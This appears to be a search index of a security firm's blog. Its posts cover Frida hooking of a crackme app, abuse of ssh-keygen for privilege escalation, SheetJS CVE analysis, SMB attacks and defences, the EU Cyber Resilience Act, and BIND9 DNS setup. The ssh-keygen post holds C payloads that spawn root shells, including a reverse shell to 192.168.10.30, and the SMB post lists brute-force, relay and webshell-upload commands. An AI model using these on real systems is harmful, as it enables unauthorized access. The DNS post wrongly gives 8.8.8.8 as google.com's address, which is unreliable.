ID","text":"<p>List all running processes to locate the app:</p> <pre><code>frida-ps -Ua\n</code></pre>"},{"location":"blog/posts/15-12-2024/#step-2-attach-to-the-process-and-enumerate-methods","title":"Step 2: Attach to the Process and Enumerate Methods","text":"<p>Create a script to list methods in the app:</p> <pre><code>// listmethods.js\nJava.perform(() =&gt; {\n  const groups = Java.enumerateMethods(\"*MainActivity*!onCl*\");\n  console.log(JSON.stringify(groups, null, 2));\n});\n</code></pre> <p>Attach to the process and execute the script:</p> <pre><code>frida -U &lt;PID&gt; -l listmethods.js\n</code></pre>"},{"location":"blog/posts/15-12-2024/#step-3-override-the-method-implementation","title":"Step 3: Override the Method Implementation","text":"<p>Use Frida to modify the <code>onClick()</code> method:</p> <pre><code>// override.js\nJava.perform(() =&gt; {\n  const main = Java.use('sg.vantagepoint.uncrackable1.MainActivity$1');\n  main.onClick.implementation = function () {\n    console.log('Pwned!');\n  };\n});\n</code></pre> <p>Run the script and verify that pressing \"OK\" no longer closes the app.</p>"},{"location":"blog/posts/15-12-2024/#extracting-the-secret-passphrase","title":"Extracting the Secret Passphrase","text":"<p>Inspect the code further to find the function responsible for decrypting the secret passphrase. Log the decryption output using Frida:</p> <pre><code>// logDecryptor.js\nJava.perform(() =&gt; {\n  const AESDecryptor = Java.use(\"sg.vantagepoint.a.a\");\n  AESDecryptor[\"a\"].implementation = function (bArr, bArr2) {\n    console.log(`AESDecryptor.decrypt is called: bArr=${bArr}, bArr2=${bArr2}`);\n    const result = this[\"a\"](bArr, bArr2);\n    console.log(`AESDecryptor.decrypt result=${result}`);\n    return result;\n  };\n});\n</code></pre> <p>Convert the output byte array to a string using Python to reveal the secret phrase.</p> <p>With this setup, Android Studio enables app emulation and debugging, Burp Suite facilitates traffic interception and analysis, Frida allows dynamic application instrumentation, and Objection automates common security testing tasks. The added dynamic analysis section demonstrates the practical application of these tools in extracting secrets and bypassing protections, making this guide a comprehensive resource for mobile app security testing.</p>"},{"location":"blog/posts/17-10-2024/","title":"Abusing ssh-keygen","text":"<p>SSH-Keygen is a tool that allows you to create and manage SSH keys, this tool is present in most UNIX systems today as a tool to facilitate the management of SSH keys.</p> <p>In this article we will explore some methods to abuse this tool with certain configurations as a method of persistence or privilege escalation on the system.</p> <p>In particular, we will abuse a specific functionality of this binary that allows the loading of public keys from a card reader library, this option is the -D parameter, its use is as follows: </p> <pre><code>ssh-keygen -D ./lib.so\n</code></pre>"},{"location":"blog/posts/17-10-2024/#how-to-generate-the-payload","title":"How to generate the payload","text":"<p>Now that we've explained how to use this function, let's look in more detail at how to generate a loadable payload, for which we'll first need to obtain a version of pkcs11.h . This header file is where we define the data types needed for the function of our library that will call ssh-keygen when using the -D parameter. </p> <p>In our case, we will go to the Open Smart Card repository and download the version we need from the following URL</p> <p>Github Code </p> <p>With this file we will proceed to write a small program in C with the necessary structure to be executed by ssh-keygen, in our case this program will spawn a bash shell.</p> <pre><code>#include \"pkcs11.h\"\n#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n\nCK_RV C_GetFunctionList(CK_FUNCTION_LIST_PTR_PTR ppFunctionList) {\n\n    pid_t pid = fork();\n\n    if (pid == 0) {\n\n        char *cmd = \"/bin/bash\";\n        char *args[] = {cmd, NULL};\n        execv(cmd,args);\n\n   } else if(pid &gt; 0) {\n        wait(NULL);\n    } else {\n        perror(\"fork\");\n        return 1;\n    }\n\n    return CKR_OK;\n}\n</code></pre> <p>Once compiled we can load it as a library as indicated in the introduction. </p>"},{"location":"blog/posts/17-10-2024/#profit","title":"Profit","text":""},{"location":"blog/posts/17-10-2024/#case-1-sudo-ssh-keygen","title":"Case 1: Sudo SSH-Keygen","text":"<p>Let's take advantage of a scenario where our user has permissions to execute the ssh-keygen command as root.</p> <pre><code>Matching Defaults entries for pnavas on test:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/snap/bin,\n    use_pty\n\nUser pnavas may run the following commands on permx:\n    (ALL : ALL) NOPASSWD: /usr/bin/ssh-keygen\n</code></pre> <p>In this case, instead of using a simple bash call, we will load a reverse shell.</p> <pre><code>#include \u2018pkcs11.h\u2019\n#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n\nCK_RV C_GetFunctionList(CK_FUNCTION_LIST_PTR_PTR ppFunctionList) {\n\n    pid_t pid = fork();\n\n    if (pid == 0) {\n\n        char *cmd = \u2018/bin/bash\u2019;\n        char *args[] = {cmd, \u2018-c\u2019 , \u2018bash -i &gt;&amp; /dev/tcp/192.168.10.30/9001 0&gt;&amp;1\u2019, NULL};\n        execv(cmd,args);\n\n   } else if(pid &gt; 0) {\n        wait(NULL);\n    } else {\n        perror(\u2018fork\u2019);\n        return 1;\n    }\n\n    return CKR_OK;\n}\n</code></pre> <p>As a result, when we load it, we will get a root connection in our listener, we could modify it to run a shell simply as in the example in the theory section </p>"},{"location":"blog/posts/17-10-2024/#case-2-ssh-keygen-suid","title":"Case 2: SSH Keygen SUID","text":"<p>In this scenario we are going to exploit a slightly less common scenario where ssh-keygen has the SUID bit set, in this case to keep the SUID privileges we need to change the library code a bit so that the shell keeps the privileges</p> <pre><code>#include \u2018pkcs11.h\u2019\n#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n\nCK_RV C_GetFunctionList(CK_FUNCTION_LIST_PTR_PTR ppFunctionList) {\n\n    pid_t pid = fork();\n\n    if (pid == 0) {\n\n        char *cmd = \u2018/bin/bash\u2019;\n        char *args[] = {cmd, \u2018-p\u2019, NULL};\n        execv(cmd,args);\n\n   } else if(pid &gt; 0) {\n        wait(NULL);\n    } else {\n        perror(\u2018fork\u2019);\n        return 1;\n    }\n\n    return CKR_OK;\n}\n</code></pre> <p>Once compiled, we can run the command to load the library and get a shell with the necessary privileges.</p>"},{"location":"blog/posts/17-10-2024/#final-thoughts","title":"Final Thoughts","text":"<p>As demonstrated, ssh-keygen is a powerful tool that, when misconfigured or misused, can become a significant security risk. The scenarios presented in this article highlight the importance of properly configuring and restricting access to binaries with elevated privileges.</p> <p>By understanding and proactively managing the capabilities and risks associated with common tools like ssh-keygen, administrators can ensure the integrity and security of their systems. </p> <p>Note</p> <p>Always adopt the principle of least privilege and conduct regular security audits to minimize attack surfaces.</p>"},{"location":"blog/posts/19-01-2025/","title":"The day that Dependabot met SheetJS","text":"<p>It all started with a notification from Dependabot a few days ago. While reviewing an internal project repository, I encountered the following message:</p> Dependabot alert <p>I proceeded with the standard Dependabot workflow to address the issues, as I had assumed it was a routine update. However, I was surprised when the fixes for both vulnerabilities failed because the required patched version could not be found.</p> Dependabot alert for DoS in SheetJS Dependabot alert for Prototype Pollution on SheetJS <p>After some investigation, I discovered an ongoing conflict between npm and the developers of xlsx, due to an issue with the Multi-Factor Authentication (MFA) token from a few years ago. As a result, xlsx has dropped out of the npm ecosystem and is now publishing its packages through other Content Delivery Networks (CDNs) for the distribution of its packages. This has introduced a new level of complexity, making it more challenging for users of npm to update packages and address vulnerabilities effectively.</p> <p>Since our application was affected by these vulnerabilities, I decided to dig deeper into them to assess the risk of delaying the patch and to explore possible workarounds if necessary, and it was also a good excuse to write an article for the blog, an article that can surely help more than one developer to decide how to deal with the same situation in SheetJS or xlsx. With that in mind, let us analyse the two vulnerabilities reported by the dependanbot in more detail:</p>"},{"location":"blog/posts/19-01-2025/#prototype-pollution-in-sheetjs-ak-cve-2023-30533","title":"Prototype Pollution in sheetJS ak. CVE-2023-30533","text":"<p>This vulnerability in SheetJS allows an attacker to upload a specially crafted file that would corrupt existing object prototypes in the application. Prototype pollution could potentially lead to serious problems such as Remote Code Execution (RCE), Cross-Site Scripting (XSS) or Denial of Service (DoS). Depending on the context, this is a significant threat.</p> <p>Digging around, I found an article written by a researcher at Solid Labs who discovered the vulnerability. Although the article is in Russian and partially behind a paywall, it gives some insight into the context and impact of the vulnerability. On the one hand the risk seems to be limited, on the other hand it confirms that XSS can be achieved with this vulnerability, although the proof of concept for the XSS is behind the paywall.</p> <p>Using the freely available part of the article, I was able to create a basic PoC for prototype pollution with limited impact. This allowed us to test if our application was vulnerable and implement a targeted patch to sanitise the attack vector while preparing for a full version update. Also using the PoC and reviewing the commit that patched the vulnerability, I found that the vulnerability occurred when importing a sheet with comments. The root cause seems to be that the developers didn't anticipate that cell references could be manipulated by an attacker. Their final solution was to validate that the cell references were legitimate.</p> <p>Knowing this, we can create a local patch for our library version, but having worked as a pentester for several years, I was curious about how to scale this prototype pollution to XSS. Reviewing the patch was the key to finding the XSS vector:</p> Commit that fix the XSS <p>We can see that the developers added escapehtml to a line in the same commit that fixes the vulnerability. Tracing the code backwards, we can see that the corrected line was only executed when the library was used to parse the XLS to HTML using the make_html_row function. In our case, as we don't use HTML parsing in our application, this vulnerability is not critical as we don't use the vulnerable function. However, we have applied the two patches locally to improve security while we prepare for the full update.</p> <p>Knowing this, developing an exploit to generate a malicious XLSX with an XSS payload is fairly straightforward. However, in order not to make it easier to exploit by publishing a proof of concept for a difficult to mitigate vulnerability, I will not publish a working proof of concept for exploiting this XSS in a package that gets about 2.5 million downloads per week.</p>"},{"location":"blog/posts/19-01-2025/#sheetjs-regular-expression-denial-of-service-redos-cve-2024-22363","title":"SheetJS Regular Expression Denial of Service (ReDoS) (CVE-2024-22363)","text":"<p>This vulnerability allows an attacker to upload a file that causes a significant delay in the application by exploiting regex flaws in SheetJS. Although not critical to our application, I was interested in replicating the problem and creating a temporary virtual patch until the update was ready.</p> <p>The first step was to examine the commit in the SheetJS repository. The code revealed several greedy regex patterns, in particular the reported one is in the parsing of comments &lt;!--). The researcher provided a PoC demonstrating how to exploit this vulnerability.</p> <p>We can verify the vulnerability in the following way:</p> <p> Proof of Concept for ReDoS <p>While the PoC shows a delay of 42 seconds, the workload grows exponentially with larger files. A file ten times its original size would take 4,980 seconds to process - 100 times the delay for only a tenfold increase in content.</p> <p>In our case, testing the PoC on our development environment showed no noticeable delay, as our application validates that the file is a real XLS file before parsing. This validation mitigates the exploitability of the vulnerability in our setup. However, it's still necessary to address the issue as there are more greedy regex in the library.</p> <p>Two potential solutions were identified:</p> <ul> <li>Detect exploitation signs before parsing the XLS.</li> <li>Update the SheetJS version.</li> </ul> <p>The first option has drawbacks. Checking for exploit patterns via regex may inadvertently introduce a new ReDoS vulnerability, and addressing all problematic regex patterns in the application adds unnecessary complexity.</p> <p>The second option, while straightforward, is complicated by the fact that the package is no longer part of the npm ecosystem and must be imported manually.</p> <p>Given these considerations, our team at Atlansec chose the second option and updated SheetJS for this application.</p>"},{"location":"blog/posts/19-01-2025/#conclusion","title":"Conclusion","text":"<p>Dependabot's alert on the SheetJS vulnerabilities served as a reminder of the complexity of dependency management. Addressing these issues required more than a simple one-click update. To make a good decision, we took a deep dive into the nature of the vulnerabilities, analysing their impact on our application and the practicality of the solutions available.</p> <p>By closely examining the vulnerabilities, Atlansec have developed on-premises mitigation strategies that meet the needs of our application. As with most projects, it's not just about fixing alerts, it's about understanding their implications and making decisions that balance both security and operational needs. For us, it was a reminder of how vigilance and adaptability can turn dependency challenges into opportunities to strengthen our application's security posture. And how important it is to build a security posture into both the development and maintenance of the application, not just from the perspective of an occasional vulnerability test.</p>"},{"location":"blog/posts/22-12-2024/","title":"New EU Cyber Resilience Act","text":"<p>On October 23, 2024, the European Cyber Resilience Regulation came into force, marking a regulatory shift aimed at strengthening digital security across the European Union. At Atlansec, this milestone reinforces our core mission: to create solutions and digital products that are secure throughout their lifecycle and ensure the protection of the environments in which they operate.</p>"},{"location":"blog/posts/22-12-2024/#what-does-this-regulation-entail","title":"What does this regulation entail?","text":"<p>The new regulatory framework establishes clear and unified requirements to ensure cybersecurity in the design, development, manufacturing, and commercialization of digital products. Its goal is to close existing security gaps and provide consumers and businesses with the confidence that the products they purchase are designed to be secure against current and future threats.</p>"},{"location":"blog/posts/22-12-2024/#key-objectives-of-the-regulation","title":"Key Objectives of the Regulation","text":"<ul> <li>Cybersecurity standards across Europe:   These apply to all connected products, whether directly or indirectly linked to networks or devices, avoiding overlaps between legislations in different Member States.</li> <li>Security throughout the lifecycle:   Manufacturers must implement vulnerability management processes, conduct risk assessments, and issue declarations of conformity.</li> <li>Greater transparency for consumers:   Facilitating the identification of secure products, helping users make informed decisions when purchasing hardware or software.</li> <li>Shared responsibility across the value chain:   Manufacturers, importers, and distributors must ensure compliance with these measures, enhancing security at every stage\u2014from design to end use.</li> </ul>"},{"location":"blog/posts/22-12-2024/#key-aspects-of-the-new-regulation","title":"Key Aspects of the New Regulation","text":"<ul> <li>Comprehensive coverage:   All digital products are subject to the regulation, except those already governed by other standards (e.g., medical devices, aircraft, and automobiles).</li> <li>Vulnerability management:   Manufacturers must ensure their digital products remain secure against new threats through timely updates.</li> <li>Market surveillance framework:   Strengthened oversight to ensure compliance with these standards and safeguard end users.</li> </ul> <p>At Atlansec, we firmly believe that cybersecurity must be the foundation of everything we do. Our commitment is to ensure that every solution, every line of code, and every product we develop is designed with security in mind\u2014not only in digital environments but also in the systems and structures that support them. This is how we build trust in an increasingly complex digital world.</p>"},{"location":"blog/posts/24-11-2024/","title":"SMB 101","text":"<p>SMB (Server Message Block) is a protocol used to share resources such as files, printers, and directories over a network. It uses a client-server architecture, where the server makes resources available, and multiple clients can access them. Although SMB3 introduces encryption to protect data, earlier versions like SMB1 transmit information in plain text, making it vulnerable to certain attacks.</p> <p>In this article, we will focus on basic concepts, key commands, and common attacks related to SMB, highlighting the use of tools like enum4linux for enumeration.</p>"},{"location":"blog/posts/24-11-2024/#theory","title":"Theory","text":""},{"location":"blog/posts/24-11-2024/#ports-used-by-smb","title":"Ports Used by SMB","text":"<p>SMB primarily operates on the following ports:</p> <ul> <li>445/TCP: Used by modern SMB for direct connections without NetBIOS.</li> <li>139/TCP: Used by older versions relying on NetBIOS.</li> </ul>"},{"location":"blog/posts/24-11-2024/#authentication-in-smb","title":"Authentication in SMB","text":"<p>SMB employs several authentication mechanisms:</p> <ul> <li>NTLM (LAN Manager): Vulnerable to relay and brute-force attacks.</li> <li>Kerberos: More secure, used in environments with Active Directory.</li> </ul>"},{"location":"blog/posts/24-11-2024/#enumeration-with-smb","title":"Enumeration with SMB","text":"<p>Enumeration is the initial step to gather information about shared resources, users, and the SMB server configuration. Here are some common tools for this purpose:</p>"},{"location":"blog/posts/24-11-2024/#enum4linux","title":"Enum4linux","text":"<p>Enum4linux is an enumeration tool specifically designed for SMB. It allows identifying shared resources, password policies, and users on Windows systems.</p> <p>Common Commands:</p> <pre><code>enum4linux &lt;IP&gt;\n</code></pre> <p>Specific Modes:</p> <ul> <li>Enumerate users:</li> </ul> <pre><code>enum4linux -U &lt;IP&gt;\n</code></pre> <ul> <li>Enumerate shared resources:</li> </ul> <pre><code>enum4linux -S &lt;IP&gt;\n</code></pre> <ul> <li>Enumerate domain information:</li> </ul> <pre><code>enum4linux -n &lt;IP&gt;\n</code></pre> <p>Typical Outputs:</p> <ul> <li>Available shared resources.</li> <li>System users.</li> <li>Password policies, such as expiration and minimum length.</li> </ul>"},{"location":"blog/posts/24-11-2024/#smbclient","title":"SMBClient","text":"<p>SMBClient is a tool integrated into Linux systems for interacting directly with SMB resources.</p> <p>Example Usage:</p> <pre><code>smbclient //&lt;IP&gt;/&lt;share_name&gt; -U &lt;username&gt;\n</code></pre> <p>After connecting, you can list, download, and upload files with FTP-like commands:</p> <pre><code>ls      # List current directory (file management and navigation commands similar to Linux)\nget     # Download a file\nput     # Upload a file\n</code></pre> <p>Enumerating shared resources:</p> <pre><code>smbclient -L //&lt;IP&gt; -U &lt;username&gt;\n</code></pre>"},{"location":"blog/posts/24-11-2024/#common-smb-attacks","title":"Common SMB Attacks","text":""},{"location":"blog/posts/24-11-2024/#null-sessions","title":"Null Sessions","text":"<p>Null sessions occur when an SMB server allows connections without authentication, exposing information such as shared resources and users.</p> <p>Enumerating Null Sessions with smbclient:</p> <pre><code>smbclient -L //&lt;IP&gt; -N\n</code></pre> <p>Danger</p> <p>Attackers can use this information to plan more advanced attacks, such as brute-force password attacks.</p>"},{"location":"blog/posts/24-11-2024/#brute-force-and-password-spraying","title":"Brute Force and Password Spraying","text":"<p>SMB can be vulnerable to brute-force attacks if proper security measures are not implemented. Tools like Hydra and Medusa are common for this purpose.</p> <p>Hydra for SMB:</p> <pre><code>hydra -L users.txt -P passwords.txt smb://&lt;IP&gt;\n</code></pre> <p>NetExec:</p> <pre><code>nxc smb &lt;IP&gt; -u users.txt -p passwords.txt\n</code></pre> <p>Danger</p> <p>The attacker may gain unauthorized access to shared resources if valid credentials are cracked.</p>"},{"location":"blog/posts/24-11-2024/#ntlm-relay","title":"NTLM Relay","text":"<p>This attack intercepts and forwards NTLM authentications to impersonate the legitimate user. SMB servers with signing disabled are especially vulnerable.</p> <p>Using Responder:</p> <pre><code>responder -I &lt;network_interface&gt;\n</code></pre> <p>Tip</p> <p>In order to mitigate, enable SMB signing and use Kerberos authentication instead of NTLM.</p>"},{"location":"blog/posts/24-11-2024/#credential-sniffing","title":"Credential Sniffing","text":"<p>Older versions like SMB1 transmit credentials in plain text, allowing an attacker to capture credentials with tools like Wireshark.</p> <p>Wireshark Filter:</p> <pre><code>tcp.port == 445\n</code></pre> <p>Danger</p> <p>An attacker may use captured credentials to access the SMB server.</p>"},{"location":"blog/posts/24-11-2024/#file-upload-for-rce","title":"File Upload for RCE","text":"<p>If an SMB resource allows writing, an attacker may upload malicious files, such as web shells, to execute remote commands.</p> <p>Uploading with SMBClient:</p> <pre><code>smbclient //&lt;IP&gt;/&lt;share_name&gt; -U &lt;username&gt;\nput webshell.aspx\n</code></pre> <p>Danger</p> <p>This can compromise the server, allowing command execution or malware installation.</p>"},{"location":"blog/posts/24-11-2024/#defenses-against-smb-exploits","title":"Defenses Against SMB Exploits","text":"<ol> <li> <p>Disable SMB1: It is outdated and vulnerable. Replace it with SMB2 or SMB3:</p> <pre><code>Set-SmbServerConfiguration -EnableSMB1Protocol $false\n</code></pre> </li> <li> <p>Enable SMB Signing: To prevent NTLM relay attacks.</p> </li> <li>Restrict Permissions: Ensure shared resources are protected with strict permissions.</li> <li>SMB3 Encryption: SMB3 allows encrypting traffic, protecting against sniffing.</li> <li>Regular Monitoring: Use tools like Splunk or Wireshark to detect anomalous activity.</li> </ol> <p>In the next article of this series on SMB we will discuss common implementation errors and some known vulnerabilities of some implementations of the protocol.</p>"},{"location":"blog/posts/26-01-2025/","title":"Comprehensive Guide to DNS: Overview, Setup & Security","text":"<p>Understanding the Domain Name System (DNS) is essential for anyone interested in how the internet works. DNS plays a crucial role in translating human-friendly domain names into machine-readable IP addresses, ensuring seamless web navigation.</p> <p>This guide walks you through:</p> <ul> <li>The hierarchical structure of DNS and its key components.</li> <li>Types of DNS queries and how they function.</li> <li>DNS security concerns and protective measures like DNSSEC.</li> <li>Setting up a local DNS server using BIND9 for improved performance, privacy, and content filtering.</li> </ul> <p>So, if you want to take your knowledge to the next level and discover how this hierarchical system ensures that every page you visit is just a click away, read on.</p>"},{"location":"blog/posts/26-01-2025/#the-basics-what-does-a-dns-do","title":"The Basics: What Does a DNS Do?","text":"<p>When you enter a domain name into your browser, your computer doesn\u2019t understand that name directly. Instead, your device initiates a process called name resolution to find the corresponding IP address. DNS servers handle this resolution through a structured, hierarchical system.</p>"},{"location":"blog/posts/26-01-2025/#the-hierarchy-of-dns-servers","title":"The Hierarchy of DNS Servers","text":"Hierarchy of DNS Servers for Google <p>The DNS operates as a distributed, hierarchical system. Each level in this hierarchy plays a specific role in translating domain names into IP addresses. Here\u2019s how it works:</p>"},{"location":"blog/posts/26-01-2025/#recursive-resolver-your-dns-query-starts-here","title":"Recursive Resolver (Your DNS Query Starts Here)","text":"<ul> <li>When you type a URL in your browser, your device sends a request to a recursive resolver. This is usually provided by your Internet Service Provider (ISP) or a third-party service like Google Public DNS or Cloudflare.</li> <li>The recursive resolver's job is to handle your query and fetch the correct IP address by contacting other DNS servers on your behalf.</li> </ul>"},{"location":"blog/posts/26-01-2025/#root-dns-servers-the-starting-point","title":"Root DNS Servers (The Starting Point)","text":"<ul> <li>If the recursive resolver doesn\u2019t already have the IP address cached, it contacts one of the 13 root DNS servers distributed globally.</li> <li>These servers don\u2019t store specific domain-to-IP mappings but point to the next level in the hierarchy: Top-Level Domain (TLD) servers.</li> </ul>"},{"location":"blog/posts/26-01-2025/#top-level-domain-tld-servers","title":"Top-Level Domain (TLD) Servers","text":"<ul> <li>TLD servers manage domains based on their suffix, such as <code>.com</code>, <code>.org</code>, or <code>.net</code>. For instance, if you\u2019re visiting <code>google.com</code>, the root server will direct your query to the <code>.com</code> TLD server.</li> <li>The TLD server then provides the address of the authoritative name server for the requested domain.</li> </ul>"},{"location":"blog/posts/26-01-2025/#authoritative-name-server","title":"Authoritative Name Server","text":"<ul> <li>The authoritative name server is the final step in the chain. It holds the actual DNS records for the domain, including the IP address of the web server.</li> <li>For google, if you\u2019re looking for <code>google.com</code>, the authoritative server will return its corresponding IP address (e.g., <code>8.8.8.8</code>).</li> </ul>"},{"location":"blog/posts/26-01-2025/#returning-the-answer","title":"Returning the Answer","text":"<ul> <li>Once the recursive resolver gets the IP address from the authoritative server, it sends it back to your browser. Your browser can then use the IP address to connect to the website\u2019s server and load the page.</li> </ul>"},{"location":"blog/posts/26-01-2025/#types-of-dns-queries","title":"Types of DNS Queries","text":"<p>During this process, there are three main types of DNS queries:</p> <ol> <li>Recursive Query: The resolver takes full responsibility for finding the IP address and returns it to the client.</li> <li>Iterative Query: The resolver queries each DNS server in sequence, receiving referrals to the next server until it finds the IP address.</li> <li>Non-Recursive Query: If the resolver already has the requested information cached, it immediately returns the result.</li> </ol>"},{"location":"blog/posts/26-01-2025/#dns-records-the-building-blocks","title":"DNS Records: The Building Blocks","text":"<p>The authoritative name server stores different types of DNS records that contain specific information about a domain. Some of the most common records include:</p> <ul> <li>A Record: Maps a domain to an IPv4 address.</li> <li>AAAA Record: Maps a domain to an IPv6 address.</li> <li>CNAME Record: Points a domain to another domain (used for aliases).</li> <li>MX Record: Specifies mail servers for email delivery.</li> <li>TXT Record: Provides additional information about a domain, often used for verification.</li> </ul>"},{"location":"blog/posts/26-01-2025/#dns-caching-speeding-things-up","title":"DNS Caching: Speeding Things Up","text":"<p>To improve performance and reduce the load on DNS servers, caching is used at various levels:</p> <ul> <li>Browser Cache: Your browser temporarily stores DNS responses for domains you visit frequently.</li> <li>Operating System Cache: Your device\u2019s operating system also caches DNS responses to avoid redundant queries.</li> <li>Resolver Cache: The recursive resolver keeps a cache of recently queried domains to speed up future lookups.</li> </ul> <p>Caching ensures that most DNS queries don\u2019t need to traverse the entire hierarchy, making internet browsing faster and more efficient.</p> <p>To observe how DNS caching reduces response times, let's use the dig command paying attention to the Query Time for google domain:</p> <p>In the first trial we got:</p> <pre><code>; &lt;&lt;&gt;&gt; DiG 9.18.28-1~deb12u2-Debian &lt;&lt;&gt;&gt; google.com\n;; global options: +cmd\n;; Got answer:\n;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 25335\n;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1\n\n;; OPT PSEUDOSECTION:\n; EDNS: version: 0, flags:; udp: 1232\n;; QUESTION SECTION:\n;google.com.                    IN      A\n\n;; ANSWER SECTION:\ngoogle.com.             215     IN      A       142.250.200.142\n\n;; Query time: 68 msec\n</code></pre> <p>And in the second time, we got:</p> <pre><code>; &lt;&lt;&gt;&gt; DiG 9.18.28-1~deb12u2-Debian &lt;&lt;&gt;&gt; google.com\n;; global options: +cmd\n;; Got answer:\n;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 44597\n;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1\n\n;; OPT PSEUDOSECTION:\n; EDNS: version: 0, flags:; udp: 1232\n;; QUESTION SECTION:\n;google.com.                    IN      A\n\n;; ANSWER SECTION:\ngoogle.com.             287     IN      A       142.250.200.78\n\n;; Query time: 36 msec\n</code></pre> <p>As we can see, the time has decreased.</p>"},{"location":"blog/posts/26-01-2025/#dns-security","title":"DNS Security","text":"<p>Despite its importance, the DNS system has vulnerabilities that can be exploited by attackers. Some common issues include:</p> <ul> <li>DNS Spoofing/Poisoning: Malicious actors inject false DNS records into a cache, redirecting users to fraudulent websites.</li> <li>DDoS Attacks: This is one of the most well-known attacks consisting on flooding DNS servers with traffic to disrupt service.</li> <li>Man-in-the-Middle Attacks: Intercepting DNS queries to modify responses.</li> </ul> <p>To combat these threats, technologies like DNSSEC (Domain Name System Security Extensions) add cryptographic signatures to DNS records, ensuring their authenticity. Imagine you want to visit google.com:</p> <ol> <li>Your browser requests the IP address for google.com from a recursive resolver.</li> <li>The resolver checks the DNSSEC signatures at each level (root, .com, and google.com).</li> <li>If all signatures are valid, the resolver returns the IP address.</li> <li>If any signature fails, the resolver knows the data has been tampered with and discards it.</li> </ol>"},{"location":"blog/posts/26-01-2025/#setup-a-local-dns-for-privacy-and-performance-purposes","title":"Setup a Local DNS for Privacy and Performance purposes","text":"<p>If you've made it this far, congratulations! You now understand the basics and key principles of DNS servers. With this knowledge, you're ready to roll up your sleeves and set up your own local DNS server. Doing so opens up a world of possibilities: you can filter unwanted content across your network, enhance browsing performance, and even navigate the internet more securely, minimizing the risk of viruses and other online threats.</p>"},{"location":"blog/posts/26-01-2025/#bind9","title":"Bind9","text":"<p>In this blog, we'll use the BIND9 DNS server to set up a DNS server directly on our computer. This hands-on approach will let us experience what it\u2019s like to have a fully functional DNS server running within our own network\u2014right from the comfort of our own machine!</p> <p>Let's first install bind9:</p> <pre><code>sudo apt update\nsudo apt install bind9 dnsutils\n</code></pre> <p>Configure your system to first ask the local DNS server that we have installed:</p> <pre><code>sudo nano /etc/resolv.conf\n</code></pre> <p>Add the local server as the first line.</p> <pre><code>nameserver 127.0.0.1\n</code></pre> <p>After that, we will edit the configuration file:</p> <pre><code>sudo nano /etc/bind/named.conf.options\n</code></pre> <p>Remove everything in that file and add the following:</p> <pre><code>acl \"trusted\" {\n    192.168.0.0/16;\n    localhost;\n};\n\noptions {\n    directory \"/var/cache/bind\";\n\n    recursion yes;\n    allow-query { trusted; };\n\n    forwarders {\n        1.1.1.3;\n        1.1.1.2;\n    };\n\n    dnssec-validation auto;\n\n    listen-on { any; };\n    listen-on-v6 { any; };\n};\n</code></pre> <p>This ACL specifies which clients are considered \"trusted\" and can interact with the DNS server.</p> <p>The options block contains global settings for the BIND9 server. Let\u2019s go through each line:</p> <ul> <li> <p><code>directory \"/var/cache/bind\";</code> This specifies the directory where BIND will store its cache and related files.</p> </li> <li> <p><code>recursion yes;</code> Enables recursive queries, meaning the server will resolve DNS queries on behalf of clients by querying other DNS servers if it doesn\u2019t have the answer cached or locally configured.</p> </li> <li> <p><code>allow-query { trusted; };</code> Restricts which clients can send queries to the server. Only clients defined in the trusted ACL (local network and localhost) are allowed to query this DNS server.</p> </li> <li> <p><code>forwarders { 1.1.1.3; 1.1.1.2; };</code> Defines external DNS servers (in this case, Cloudflare's filtered DNS servers) to which the server will forward queries it cannot resolve locally. The server acts as an intermediary, forwarding unresolved queries to these upstream servers.</p> <ul> <li>1.1.1.3: Blocks malicious content.</li> <li>1.1.1.2: Blocks malware-related content.</li> </ul> </li> <li> <p><code>dnssec-validation auto;</code> Enables DNSSEC validation automatically, ensuring the authenticity and integrity of DNS responses using cryptographic signatures.</p> </li> </ul> <p>With this configuration, we\u2019ve implemented basic security measures by trusting Cloudflare's DNS servers to handle forwarded queries, ensuring that responses are filtered to avoid malicious domains.</p> <p>We can check our performance improvement by doing the same as before, using the dig command to look for the Query Time of google.com domain.</p> <pre><code>; &lt;&lt;&gt;&gt; DiG 9.18.28-1~deb12u2-Debian &lt;&lt;&gt;&gt; google.com\n;; global options: +cmd\n;; Got answer:\n;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 56385\n;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1\n\n;; OPT PSEUDOSECTION:\n; EDNS: version: 0, flags:; udp: 1232\n; COOKIE: 2b2a789af74949000100000067966b06329ed55c149fd975 (good)\n;; QUESTION SECTION:\n;google.com.                    IN      A\n\n;; ANSWER SECTION:\ngoogle.com.             300     IN      A       142.250.200.142\n\n;; Query time: 67 msec\n;; SERVER: 127.0.0.1#53(127.0.0.1) (UDP)\n;; MSG SIZE  rcvd: 83\n</code></pre> <p>After the second query, we achieve a 0ms response time, as our local DNS server efficiently retrieves the result from its cache.</p> <pre><code>; &lt;&lt;&gt;&gt; DiG 9.18.28-1~deb12u2-Debian &lt;&lt;&gt;&gt; google.com\n;; global options: +cmd\n;; Got answer:\n;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 51691\n;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1\n\n;; OPT PSEUDOSECTION:\n; EDNS: version: 0, flags:; udp: 1232\n; COOKIE: a2419e6c5e03859d0100000067966b096b0ad0c0a30e2273 (good)\n;; QUESTION SECTION:\n;google.com.                    IN      A\n\n;; ANSWER SECTION:\ngoogle.com.             297     IN      A       142.250.200.142\n\n;; Query time: 0 msec\n;; SERVER: 127.0.0.1#53(127.0.0.1) (UDP)\n;; MSG SIZE  rcvd: 83\n</code></pre> <p>We can see that the SERVER we are asking is <code>127.0.0.1</code> as it is our bind9 DNS server</p> <p>However, what if we want to take things a step further and enforce our own restrictions? Whether it\u2019s for enhanced security, blocking specific websites, or creating a safer internet environment for children, we can configure BIND9 to restrict access to a custom list of domains. This gives us 